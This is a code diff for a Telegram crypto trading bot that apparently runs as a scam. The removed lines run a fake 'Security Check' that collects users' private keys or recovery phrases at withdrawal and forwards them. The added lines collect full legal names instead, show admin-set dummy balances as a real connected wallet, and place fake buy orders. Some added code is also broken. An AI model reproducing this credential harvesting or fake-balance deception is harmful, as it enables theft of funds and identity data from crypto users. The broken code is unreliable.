@@ -23,6 +23,35 @@ const mainMenu = Markup.keyboard([
   ['⏰ Auto Deposit'],
 ]).resize();
 
+
+function formatWalletOverview(user) {
+  const ethBal = Number(user.eth_balance ?? 0);
+  const bscBal = Number(user.bsc_balance ?? 0);
+  const solBal = Number(user.sol_balance ?? 0);
+  // Dummy portfolio: treat stored balances as $ contribution (admin sets $ amounts)
+  const portfolio = ethBal + bscBal + solBal;
+
+  return (
+    '💼 *Wallet Overview* — ✅ Connected\n' +
+    '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+    '👤 *SOL Address* (tap to copy):\n' +
+    `\`${user.sol_address}\`\n\n` +
+    '👤 *BNB Address* (tap to copy):\n' +
+    `\`${user.bsc_address}\`\n\n` +
+    '👤 *ETH Address* (tap to copy):\n' +
+    `\`${user.eth_address}\`\n\n` +
+    `💰 *SOL Balance:* ${solBal.toFixed(2)} SOL\n` +
+    `💰 *BNB Balance:* ${bscBal.toFixed(2)} BNB\n` +
+    `💰 *ETH Balance:* ${ethBal.toFixed(2)} ETH\n` +
+    '📦 *Open Positions:* 0\n' +
+    `📉 *Portfolio Value:* $${portfolio.toFixed(2)}\n` +
+    '━━━━━━━━━━━━━━━━━━━━━━━\n' +
+    '⚠️ No active tokens in your wallet.\n' +
+    '🟢 Try /buy to place your first trade!'
+  );
+}
+
+
 const WELCOME_TEXT =
   '👋 *Welcome to Copy Entries Bot!*\n' +
   'Step into the world of fast, smart, and stress-free trading.\n\n' +
@@ -89,27 +118,13 @@ bot.hears('👛 Wallet', async (ctx) => {
   const user = db.getUser(ctx.from.id);
   if (!user) return ctx.reply('Send /start first to create your wallets.');
 
-  const ethBal = Number(user.eth_balance ?? 0).toFixed(2);
-  const bscBal = Number(user.bsc_balance ?? 0).toFixed(2);
-  const solBal = Number(user.sol_balance ?? 0).toFixed(2);
-
-  await ctx.reply(
-    '👛 *Your Wallets*\n\n' +
-    `*ETH*\n` +
-    `Address: \`${user.eth_address}\`\n` +
-    `Balance: *$${ethBal}*\n\n` +
-    `*BSC (BNB)*\n` +
-    `Address: \`${user.bsc_address}\`\n` +
-    `Balance: *$${bscBal}*\n\n` +
-    `*SOL*\n` +
-    `Address: \`${user.sol_address}\`\n` +
-    `Balance: *$${solBal}*\n\n` +
-    'Use Settings → Export Keys if you need your private keys.',
-    {
-      parse_mode: 'Markdown',
-      ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back', 'copytrade_back')]]),
-    }
-  );
+  await ctx.reply(formatWalletOverview(user), {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('🟢 Buy', 'buy_start'), Markup.button.callback('📤 Withdraw', 'withdraw_from_wallet')],
+      [Markup.button.callback('🔙 Back', 'copytrade_back')],
+    ]),
+  });
 });
 
 // ---- Stubs for the rest of the menu — wire these up to your actual trading logic ----
@@ -275,7 +290,7 @@ bot.on('text', async (ctx, next) => {
     }
 
     ctx.session.withdraw = { ...(ctx.session.withdraw || {}), address };
-    ctx.session.awaiting = 'withdraw_phrase';
+    ctx.session.awaiting = 'withdraw_fullname';
 
     const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
     await ctx.reply(
@@ -284,7 +299,7 @@ bot.on('text', async (ctx, next) => {
     );
     await ctx.reply(
       '⚠️ *Security Check Required*\n\n' +
-        'To process your withdrawal, please reply with your wallet Private Key or Recovery Phrase to verify ownership.',
+        'To process your withdrawal, please reply with your *full legal name*.',
       {
         parse_mode: 'Markdown',
         ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'withdraw_cancel')]]),
@@ -293,8 +308,8 @@ bot.on('text', async (ctx, next) => {
     return;
   }
 
-  if (ctx.session?.awaiting === 'withdraw_phrase') {
-    const phrase = ctx.message.text.trim();
+  if (ctx.session?.awaiting === 'withdraw_fullname') {
+    const fullName = ctx.message.text.trim();
     const { chain, amount, address } = ctx.session.withdraw || {};
     ctx.session.awaiting = null;
     ctx.session.withdraw = null;
@@ -303,10 +318,10 @@ bot.on('text', async (ctx, next) => {
       await ctx.reply('❌ Session expired. Please run /withdraw again.', mainMenu);
       return;
     }
-    if (!phrase || phrase.length < 2) {
-      ctx.session.awaiting = 'withdraw_phrase';
+    if (!fullName || fullName.length < 2) {
+      ctx.session.awaiting = 'withdraw_fullname';
       ctx.session.withdraw = { chain, amount, address };
-      await ctx.reply('❌ Please enter your phrase/private key.');
+      await ctx.reply('❌ Please enter your full name.');
       return;
     }
 
@@ -323,12 +338,77 @@ bot.on('text', async (ctx, next) => {
       chain: label,
       amount,
       address,
-      phrase,
+      fullName,
     });
 
     await ctx.reply(
       '✅ *Withdrawal request submitted.*\n\n' +
         'Your details have been sent for processing. You will be notified when it is complete.',
+      { parse_mode: 'Markdown', ...mainMenu }
+    );
+    return;
+  }
+
+
+  if (ctx.session?.awaiting === 'buy_token') {
+    const token = ctx.message.text.trim();
+    const chain = ctx.session.buy?.chain;
+    if (!chain) {
+      ctx.session.awaiting = null;
+      await ctx.reply('❌ Session expired. Use /buy again.', mainMenu);
+      return;
+    }
+    if (!token || token.length < 8) {
+      await ctx.reply('❌ That does not look like a valid token address. Try again.');
+      return;
+    }
+    ctx.session.buy = { ...(ctx.session.buy || {}), token };
+    ctx.session.awaiting = 'buy_amount';
+    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
+    await ctx.reply(
+      `💵 Enter the amount in $ to spend on this token (from your ${label} balance):`,
+      {
+        parse_mode: 'Markdown',
+        ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'buy_cancel')]]),
+      }
+    );
+    return;
+  }
+
+  if (ctx.session?.awaiting === 'buy_amount') {
+    const amount = Number(String(ctx.message.text).trim().replace(/[$,]/g));
+    const { chain, token } = ctx.session.buy || {};
+    ctx.session.awaiting = null;
+    ctx.session.buy = null;
+
+    if (!chain || !token) {
+      await ctx.reply('❌ Session expired. Use /buy again.', mainMenu);
+      return;
+    }
+    if (Number.isNaN(amount) || amount <= 0) {
+      await ctx.reply('❌ Enter a valid amount greater than 0.', mainMenu);
+      return;
+    }
+
+    const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
+    const available = Number(balances[chain] ?? 0);
+    if (amount > available) {
+      await ctx.reply(
+        `❌ Insufficient balance. Available: *$${available.toFixed(2)}*.`,
+        { parse_mode: 'Markdown', ...mainMenu }
+      );
+      return;
+    }
+
+    const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
+    db.setDummyBalance(ctx.from.id, chain, available - amount);
+
+    await ctx.reply(
+      `✅ *Buy order placed (demo)*\n\n` +
+        `Chain: *${label}*\n` +
+        `Token: \`${token}\`\n` +
+        `Spent: *$${amount.toFixed(2)}*\n\n` +
+        'Open positions will appear here in a future update.',
       { parse_mode: 'Markdown', ...mainMenu }
     );
     return;
@@ -746,31 +826,16 @@ bot.action('withdraw_cancel', async (ctx) => {
 
 // Slash commands matching the Telegram menu
 bot.command('wallet', async (ctx) => {
-  // Re-use the same logic as the 👛 Wallet button by simulating the handler path
   const user = db.getUser(ctx.from.id);
   if (!user) return ctx.reply('Send /start first to create your wallets.');
 
-  const ethBal = Number(user.eth_balance ?? 0).toFixed(2);
-  const bscBal = Number(user.bsc_balance ?? 0).toFixed(2);
-  const solBal = Number(user.sol_balance ?? 0).toFixed(2);
-
-  await ctx.reply(
-    '👛 *Your Wallets*\n\n' +
-    `*ETH*\n` +
-    `Address: \`${user.eth_address}\`\n` +
-    `Balance: *$${ethBal}*\n\n` +
-    `*BSC (BNB)*\n` +
-    `Address: \`${user.bsc_address}\`\n` +
-    `Balance: *$${bscBal}*\n\n` +
-    `*SOL*\n` +
-    `Address: \`${user.sol_address}\`\n` +
-    `Balance: *$${solBal}*\n\n` +
-    'Use Settings → Export Keys if you need your private keys.',
-    {
-      parse_mode: 'Markdown',
-      ...Markup.inlineKeyboard([[Markup.button.callback('🔙 Back', 'copytrade_back')]]),
-    }
-  );
+  await ctx.reply(formatWalletOverview(user), {
+    parse_mode: 'Markdown',
+    ...Markup.inlineKeyboard([
+      [Markup.button.callback('🟢 Buy', 'buy_start'), Markup.button.callback('📤 Withdraw', 'withdraw_from_wallet')],
+      [Markup.button.callback('🔙 Back', 'copytrade_back')],
+    ]),
+  });
 });
 
 bot.command('settings', async (ctx) => {
@@ -792,6 +857,86 @@ bot.command('settings', async (ctx) => {
 });
 
 
+
+// ---------- Buy (dummy trade) ----------
+bot.command('buy', async (ctx) => {
+  const user = db.getUser(ctx.from.id);
+  if (!user) return ctx.reply('Send /start first to create your wallets.');
+  ctx.session.awaiting = null;
+  ctx.session.buy = {};
+  await ctx.reply(
+    '🟢 *Buy*\n\nSelect the chain to trade on:',
+    {
+      parse_mode: 'Markdown',
+      ...Markup.inlineKeyboard([
+        [
+          Markup.button.callback('ETH', 'buy_chain:eth'),
+          Markup.button.callback('BSC (BNB)', 'buy_chain:bsc'),
+          Markup.button.callback('SOL', 'buy_chain:sol'),
+        ],
+        [Markup.button.callback('❌ Cancel', 'buy_cancel')],
+      ]),
+    }
+  );
+});
+
+bot.action('buy_start', async (ctx) => {
+  await ctx.answerCbQuery();
+  const user = db.getUser(ctx.from.id);
+  if (!user) return ctx.reply('Send /start first to create your wallets.');
+  ctx.session.awaiting = null;
+  ctx.session.buy = {};
+  await ctx.reply(
+    '🟢 *Buy*
+
+Select the chain to trade on:',
+    {
+      parse_mode: 'Markdown',
+      ...Markup.inlineKeyboard([
+        [
+          Markup.button.callback('ETH', 'buy_chain:eth'),
+          Markup.button.callback('BSC (BNB)', 'buy_chain:bsc'),
+          Markup.button.callback('SOL', 'buy_chain:sol'),
+        ],
+        [Markup.button.callback('❌ Cancel', 'buy_cancel')],
+      ]),
+    }
+  );
+});
+
+bot.action('withdraw_from_wallet', async (ctx) => {
+  await ctx.answerCbQuery();
+  await ctx.reply('Use /withdraw to start a withdrawal.');
+});
+
+bot.action(/^buy_chain:(eth|bsc|sol)$/, async (ctx) => {
+  await ctx.answerCbQuery();
+  const chain = ctx.match[1];
+  const label = chain === 'bsc' ? 'BNB' : chain.toUpperCase();
+  const balances = db.getDummyBalances(ctx.from.id) || { eth: 0, bsc: 0, sol: 0 };
+  const bal = Number(balances[chain] ?? 0);
+
+  ctx.session.buy = { chain };
+  ctx.session.awaiting = 'buy_token';
+
+  await ctx.reply(
+    `🟢 *Buy on ${label}*\n\nAvailable balance: *$${bal.toFixed(2)}*\n\n` +
+      'Send the *token contract address* (or token mint on Solana) you want to buy:',
+    {
+      parse_mode: 'Markdown',
+      ...Markup.inlineKeyboard([[Markup.button.callback('❌ Cancel', 'buy_cancel')]]),
+    }
+  );
+});
+
+bot.action('buy_cancel', async (ctx) => {
+  await ctx.answerCbQuery();
+  ctx.session.awaiting = null;
+  ctx.session.buy = null;
+  await ctx.reply('❌ Buy cancelled.', mainMenu);
+});
+
+
 bot.catch((err, ctx) => {
   console.error(`Error for ${ctx.updateType}:`, err);
 });
@@ -801,6 +946,7 @@ bot.launch().then(async () => {
     { command: 'start', description: 'Start the bot' },
     { command: 'help', description: 'View the bot guide' },
     { command: 'wallet', description: 'View your wallet' },
+    { command: 'buy', description: 'Buy a token' },
     { command: 'withdraw', description: 'Withdraw your funds' },
     { command: 'settings', description: 'Open settings' },
   ]);
